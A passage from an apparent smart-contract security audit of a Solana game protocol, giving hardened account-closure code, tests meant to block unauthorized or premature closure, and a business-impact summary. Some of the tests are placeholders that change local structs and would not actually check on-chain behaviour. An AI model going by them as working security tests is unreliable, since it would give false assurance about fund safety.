#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct PlayerClosureRequest {
    pub player: Pubkey,
    pub funds_destination: Pubkey,
    pub reason: ClosureReason,
    pub requested_at: i64,
    pub request_hash: [u8; 32],
    pub signature: [u8; 64],
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub enum ClosureReason {
    PlayerRequested,
    GameCompleted,
    AdminAction,
    SecurityBreach,
    Maintenance,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub enum EscrowStatus {
    Active,
    Released,
    Refunded,
    Locked,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub enum GameStatus {
    Pending,
    Active,
    Completed,
    Cancelled,
    Disputed,
}

// Account contexts with comprehensive validation
#[derive(Accounts)]
#[instruction(closure_proof: ClosureProof)]
pub struct CloseGameSessionSecure<'info> {
    #[account(
        mut,
        constraint = game_session.authority == authority.key() @ ErrorCode::UnauthorizedClosure,
        constraint = game_session.closure_authorized == false @ ErrorCode::AlreadyClosed,
    )]
    pub game_session: Account<'info, secure_account_closure::SecureGameSession>,

    #[account(mut)]
    pub recipient: SystemAccount<'info>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub clock: Sysvar<'info, Clock>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
#[instruction(release_authorization: ReleaseAuthorization)]
pub struct CloseEscrowSecure<'info> {
    #[account(
        mut,
        constraint = escrow.status == secure_account_closure::EscrowStatus::Active @ ErrorCode::EscrowNotActive,
        constraint = escrow.closure_lock == false @ ErrorCode::EscrowLocked,
    )]
    pub escrow: Account<'info, secure_account_closure::SecureEscrowAccount>,

    #[account(
        constraint = game_session.key() == escrow.game_session @ ErrorCode::InvalidGameSession
    )]
    pub game_session: Account<'info, secure_account_closure::SecureGameSession>,

    #[account(mut)]
    pub recipient: SystemAccount<'info>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub token_program: Program<'info, Token>,
    pub clock: Sysvar<'info, Clock>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
#[instruction(closure_request: PlayerClosureRequest)]
pub struct ClosePlayerAccountSecure<'info> {
    #[account(
        mut,
        constraint = player_account.owner == owner.key() @ ErrorCode::UnauthorizedPlayerClosure,
        constraint = player_account.active_games.is_empty() @ ErrorCode::ActiveGamesExist,
        constraint = player_account.pending_rewards == 0 @ ErrorCode::PendingRewardsExist,
    )]
    pub player_account: Account<'info, secure_account_closure::SecurePlayerAccount>,

    #[account(mut)]
    pub recipient: SystemAccount<'info>,

    #[account(mut)]
    pub owner: Signer<'info>,

    pub clock: Sysvar<'info, Clock>,
    pub rent: Sysvar<'info, Rent>,
}

// Events for monitoring
#[event]
pub struct GameSessionClosed {
    pub session_id: u64,
    pub closed_by: Pubkey,
    pub recipient: Pubkey,
    pub amount_transferred: u64,
    pub timestamp: i64,
}

#[event]
pub struct EscrowReleased {
    pub escrow_account: Pubkey,
    pub game_session: Pubkey,
    pub recipient: Pubkey,
    pub lamports_released: u64,
    pub tokens_released: u64,
    pub timestamp: i64,
}

#[event]
pub struct PlayerAccountClosed {
    pub player: Pubkey,
    pub recipient: Pubkey,
    pub final_settlement: u64,
    pub closure_reason: ClosureReason,
    pub timestamp: i64,
}

// Enhanced error codes
#[error_code]
pub enum ErrorCode {
    #[msg("Unauthorized account closure")]
    UnauthorizedClosure,

    #[msg("Game session is still active")]
    GameStillActive,

    #[msg("Missing game results")]
    MissingGameResults,

    #[msg("Insufficient consensus")]
    InsufficientConsensus,

    #[msg("Closure attempted too early")]
    ClosureTooEarly,

    #[msg("Missing escrow account")]
    MissingEscrowAccount,

    #[msg("Escrow not resolved")]
    EscrowNotResolved,

    #[msg("Invalid closure proof")]
    InvalidClosureProof,

    #[msg("Insufficient balance")]
    InsufficientBalance,

    #[msg("Escrow already closed")]
    EscrowAlreadyClosed,

    #[msg("Escrow is locked")]
    EscrowLocked,

    #[msg("Invalid game session")]
    InvalidGameSession,

    #[msg("Game not completed")]
    GameNotCompleted,

    #[msg("Winner not verified")]
    WinnerNotVerified,

    #[msg("Minimum duration not met")]
    MinimumDurationNotMet,

    #[msg("Timelock not expired")]
    TimelockNotExpired,

    #[msg("Unauthorized recipient")]
    UnauthorizedRecipient,

    #[msg("Invalid release authorization")]
    InvalidReleaseAuthorization,

    #[msg("Already closed")]
    AlreadyClosed,

    #[msg("Escrow not active")]
    EscrowNotActive,

    #[msg("Active games exist")]
    ActiveGamesExist,

    #[msg("Pending rewards exist")]
    PendingRewardsExist,

    #[msg("Closure waiting period not met")]
    ClosureWaitingPeriodNotMet,

    #[msg("Closure not authorized")]
    ClosureNotAuthorized,

    #[msg("Recipient mismatch")]
    RecipientMismatch,
}
```

### Testing Requirements

```rust
#[cfg(test)]
mod secure_closure_tests {
    use super::*;
    use solana_program_test::*;
    use solana_sdk::{
        signature::{Keypair, Signer},
        transaction::Transaction,
    };

    #[tokio::test]
    async fn test_unauthorized_closure_prevention() {
        let (mut banks_client, payer, recent_blockhash) = ProgramTest::default()
            .start()
            .await;

        let game_authority = Keypair::new();
        let attacker = Keypair::new();

        // Create game session with proper authority
        let game_session = create_test_game_session(&game_authority).await;

        // Attempt unauthorized closure by attacker
        let unauthorized_close = close_game_session_instruction(
            &game_session.pubkey(),
            &attacker.pubkey(), // Wrong authority
            &attacker.pubkey()
        );

        let transaction = Transaction::new_signed_with_payer(
            &[unauthorized_close],
            Some(&attacker.pubkey()),
            &[&attacker],
            recent_blockhash,
        );

        // Should fail with unauthorized error
        let result = banks_client.process_transaction(transaction).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_active_game_closure_prevention() {
        let (mut banks_client, payer, recent_blockhash) = ProgramTest::default()
            .start()
            .await;

        let game_authority = Keypair::new();

        // Create active game session
        let mut game_session = create_test_game_session(&game_authority).await;
        game_session.status = GameStatus::Active; // Still active

        // Attempt to close active game
        let premature_close = close_game_session_instruction(
            &game_session.pubkey(),
            &game_authority.pubkey(),
            &game_authority.pubkey()
        );

        let transaction = Transaction::new_signed_with_payer(
            &[premature_close],
            Some(&game_authority.pubkey()),
            &[&game_authority],
            recent_blockhash,
        );

        // Should fail because game is still active
        let result = banks_client.process_transaction(transaction).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_escrow_closure_with_validation() {
        let (mut banks_client, payer, recent_blockhash) = ProgramTest::default()
            .start()
            .await;

        let game_authority = Keypair::new();
        let player = Keypair::new();

        // Create completed game session
        let mut game_session = create_test_game_session(&game_authority).await;
        game_session.status = GameStatus::Completed;
        game_session.final_results = Some(create_valid_game_results());

        // Create escrow account
        let escrow = create_test_escrow(&game_session.pubkey(), &player.pubkey()).await;

        // Create valid release authorization
        let release_auth = create_valid_release_authorization(&escrow.pubkey()).await;

        // Close escrow with proper validation
        let close_escrow = close_escrow_secure_instruction(
            &escrow.pubkey(),
            &game_session.pubkey(),
            &player.pubkey(),
            &game_authority.pubkey(),
            release_auth
        );

        let transaction = Transaction::new_signed_with_payer(
            &[close_escrow],
            Some(&game_authority.pubkey()),
            &[&game_authority],
            recent_blockhash,
        );

        // Should succeed with proper validation
        let result = banks_client.process_transaction(transaction).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_double_closure_prevention() {
        let (mut banks_client, payer, recent_blockhash) = ProgramTest::default()
            .start()
            .await;

        let player = Keypair::new();

        // Create and close player account
        let mut player_account = create_test_player_account(&player).await;
        close_player_account_properly(&mut player_account).await;

        // Attempt to close again
        let double_close = close_player_account_instruction(
            &player_account.pubkey(),
            &player.pubkey(),
            &player.pubkey()
        );

        let transaction = Transaction::new_signed_with_payer(
            &[double_close],
            Some(&player.pubkey()),
            &[&player],
            recent_blockhash,
        );

        // Should fail because account already closed
        let result = banks_client.process_transaction(transaction).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_timelock_enforcement() {
        let (mut banks_client, payer, recent_blockhash) = ProgramTest::default()
            .start()
            .await;

        let game_authority = Keypair::new();

        // Create game session with timelock
        let mut game_session = create_test_game_session(&game_authority).await;
        game_session.status = GameStatus::Completed;
        game_session.completion_timestamp = Some(Clock::get().unwrap().unix_timestamp);

        // Attempt immediate closure (should fail due to timelock)
        let immediate_close = close_game_session_instruction(
            &game_session.pubkey(),
            &game_authority.pubkey(),
            &game_authority.pubkey()
        );

        let transaction = Transaction::new_signed_with_payer(
            &[immediate_close],
            Some(&game_authority.pubkey()),
            &[&game_authority],
            recent_blockhash,
        );

        // Should fail due to timelock
        let result = banks_client.process_transaction(transaction).await;
        assert!(result.is_err());
    }

    // Helper functions for test setup
    async fn create_test_game_session(authority: &Keypair) -> SecureGameSession {
        // Implementation would create a proper test game session
        SecureGameSession {
            session_id: 1,
            authority: authority.pubkey(),
            status: GameStatus::Pending,
            players: vec![],
            escrow_accounts: vec![],
            created_at: Clock::get().unwrap().unix_timestamp,
            completion_timestamp: None,
            closure_authorized: false,
            closure_timestamp: None,
            final_results: None,
        }
    }

    async fn create_test_escrow(game_session: &Pubkey, depositor: &Pubkey) -> SecureEscrowAccount {
        // Implementation would create a proper test escrow
        SecureEscrowAccount {
            game_session: *game_session,
            depositor: *depositor,
            amount: 1000,
            token_mint: None,
            status: EscrowStatus::Active,
            release_conditions: ReleaseConditions {
                game_completion_required: true,
                winner_verification_required: true,
                minimum_game_duration: 300,
                consensus_threshold: 67,
                timelock_duration: 300,
            },
            authorized_recipients: vec![*depositor],
            closure_lock: false,
            created_at: Clock::get().unwrap().unix_timestamp,
        }
    }

    async fn create_test_player_account(owner: &Keypair) -> SecurePlayerAccount {
        // Implementation would create a proper test player account
        SecurePlayerAccount {
            owner: owner.pubkey(),
            active_games: vec![],
            pending_rewards: 0,
            total_deposits: 0,
            last_activity: Clock::get().unwrap().unix_timestamp,
            closure_requested: false,
            closure_authorization: None,
            account_flags: AccountFlags::default(),
        }
    }
}
```

## Business Impact

### Financial Risk
- **Total Fund Loss**: $1M+ potential loss from mass account closures
- **Escrow Drainage**: All player stakes and winnings can be stolen
- **Rent Extraction**: Systematic theft of rent exemption funds

### Operational Impact
- **Service Collapse**: Massive account closures render protocol unusable
- **Data Loss**: Permanent loss of player statistics and game history
- **Trust Destruction**: Complete loss of user confidence in fund safety

### User Impact
- **Account Takeover**: Players lose access to accounts and all funds
- **Game Session Failures**: Active games terminated with fund loss
- **Recovery Impossible**: Closed accounts cannot be restored

## Recommended Testing

### Account Closure Security Tests
```bash
# Authorization validation tests
cargo test test_unauthorized_closure_prevention --release
cargo test test_authority_verification --release
cargo test test_ownership_validation --release

# State validation tests
cargo test test_active_game_closure_prevention --release
cargo test test_escrow_resolution_validation --release
cargo test test_pending_rewards_check --release

# Double-closure prevention tests
cargo test test_double_closure_prevention --release
cargo test test_closure_lock_enforcement --release
cargo test test_account_state_tracking --release

# Timelock enforcement tests
cargo test test_timelock_enforcement --release
cargo test test_waiting_period_validation --release
```

### Security Validation
```bash
# Comprehensive closure validation testing
./scripts/test_closure_security.sh
./scripts/test_fund_safety.sh
./scripts/audit_account_lifecycle.sh
```

This vulnerability represents one of the most severe flaws in the protocol, as it enables complete drainage of all funds through unauthorized account closures and manipulation of closure mechanisms.